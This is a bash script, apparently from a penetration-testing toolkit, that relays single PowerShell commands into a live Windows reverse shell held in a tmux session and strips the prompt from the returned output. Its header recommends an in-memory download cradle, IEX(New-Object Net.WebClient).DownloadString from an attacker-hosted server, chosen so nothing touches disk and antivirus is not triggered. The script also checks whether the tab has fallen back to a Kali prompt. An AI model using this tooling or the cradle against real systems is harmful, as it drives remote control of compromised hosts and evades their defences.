#!/usr/bin/env bash
# Send ONE command to a Windows PowerShell reverse-shell tmux tab and return its clean output.
# Windows counterpart to vm-rsh.sh, built to the shell-interaction discipline (docs/shell-interaction.md):
#   * ONE command per call. NO injected sentinels / markers / delimiters / nonce strings, and NO
#     string-literal splitting to dodge the command echo. Output is framed by the SHELL'S OWN prompt
#     (the natural boundary), not by tokens we emit: the echoed command line and the trailing prompt
#     are stripped, everything between is returned.
#   * $-safety WITHOUT encoding tricks: the operator's command is sent as a human would type it; the
#     one lossy layer (the VM's `bash -c`, which would expand $env:/$var/backticks) is neutralised by
#     escaping \ $ " ` for exactly that layer. You type plain PowerShell; it arrives intact.
#   * Completion is detected by pane STABILITY + a returned prompt (the command finished and the shell
#     printed its next prompt), never by waiting on a marker we injected.
#   * Liveness: if the tab shows an ATTACKER bash/zsh prompt instead of a PS prompt, the reverse shell
#     is dead (it fell back to the attacker box) -> warn LOUDLY (the false-RCE trap: whoami would then
#     return root/kali, not the target). This mirrors the doc's "probe with whoami" recovery.
#
# Usage: bash win-rsh.sh [--win shell] [--timeout 60] <session> '<one powershell command>'
#        bash win-rsh.sh --file cmd.ps1 [--win shell] <session>   # a short script (lines joined with ;)
#   For $-heavy / multi-statement enumeration, prefer hosting a readable .ps1 and running it in-memory:
#   win-rsh.sh <eng> "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/enum.ps1')"
#   (the cradle has no $ so it rides clean, the script runs on-target, nothing hits disk to trip AV).
# Assumes a live PS reverse shell in tmux window <session>:<win> (default 'shell'). VM_SH overridable
# for tests. Prints a diagnostic to stderr + exits 1 if no prompt returns within the timeout.
set -uo pipefail
VM_SH="${VM_SH:-/root/vm.sh}"
WIN="shell"; TO=60; FILE=""
while [ $# -gt 0 ]; do
  case "${1:-}" in
    --win) WIN="${2:?--win needs a name}"; shift 2;;
    --timeout) TO="${2:?--timeout needs seconds}"; shift 2;;
    --file) FILE="${2:?--file needs a path}"; shift 2;;
    *) break;;
  esac
done
SESSION="${1:?need <session>}"; shift
if [ -n "$FILE" ]; then CMD="$(tr '\n' ';' < "$FILE" | sed 's/;\+/;/g; s/;$//')"; else CMD="$*"; fi
: "${CMD:?need <command...> or --file <path>}"

capture() { bash "$VM_SH" "tmux capture-pane -pS -4000 -t $SESSION:$WIN" 2>/dev/null; }
# a line that ends in a prompt: PS reverse-shell "PS <path]> " or a cmd "<path>>" prompt
PROMPT_RE='(^PS .*> *$)|([A-Za-z]:\\.*> *$)|(^PS> *$)'

# clear scrollback so only THIS command's echo+output+next-prompt remain, then send the command.
# Escape \ $ " ` for the single VM `bash -c` layer (base64 preserves everything else verbatim).
CMD_ESC="$(printf '%s' "$CMD" | sed 's/\\/\\\\/g; s/`/\\`/g; s/\$/\\$/g; s/"/\\"/g')"
bash "$VM_SH" "tmux clear-history -t $SESSION:$WIN 2>/dev/null; tmux send-keys -t $SESSION:$WIN \"$CMD_ESC\" Enter" >/dev/null 2>&1

# Poll until the shell prints its next prompt AND the pane is stable (command finished).
prev=""; pane=""; stable=0; i=0
while [ "$i" -lt "$TO" ]; do
  sleep 2; i=$((i+2))
  pane="$(capture)"
  if printf '%s' "$pane" | grep -qE "$PROMPT_RE"; then
    if [ "$pane" = "$prev" ]; then stable=1; break; fi
  fi
  prev="$pane"
done

if [ "$stable" -ne 1 ]; then
  if printf '%s' "$pane" | grep -qE '㉿|@kali|:~[#$] *$|\$ $'; then
    echo "win-rsh: the tab shows an ATTACKER shell prompt -- the reverse shell is DEAD (fell back to the attacker box)." >&2
    echo "win-rsh: output is NOT the target (false-RCE trap). Re-pop the shell; do not trust root/kali as the target." >&2
  else
    echo "win-rsh: no returning prompt within ${TO}s in $SESSION:$WIN -- the shell may be stuck (waiting on input?) or the command is long. Probe with a bare 'whoami', or raise --timeout." >&2
  fi
  exit 1
fi

# Strip the echoed command line and the trailing prompt using the shell's OWN prompt as the frame.
printf '%s' "$pane" | CMD="$CMD" python3 -c '
import os, re, sys
pane = sys.stdin.read().split("\n")
cmd = os.environ["CMD"].strip().splitlines()[0][:40]
prompt = re.compile(r"(^PS .*> *$)|([A-Za-z]:\\.*> *$)|(^PS> *$)")
# echo line = the LAST line carrying (the start of) our command (the most recent invocation, so
# stale scrollback / a prior run of the same command never wins); output starts after it.
start = 0
for k in range(len(pane) - 1, -1, -1):
    if cmd and cmd in pane[k]:
        start = k + 1; break
# output ends at the FIRST prompt line after the echo (the next shell prompt).
end = len(pane)
for k in range(start, len(pane)):
    if prompt.search(pane[k]):
        end = k; break
print("\n".join(pane[start:end]).strip())
'
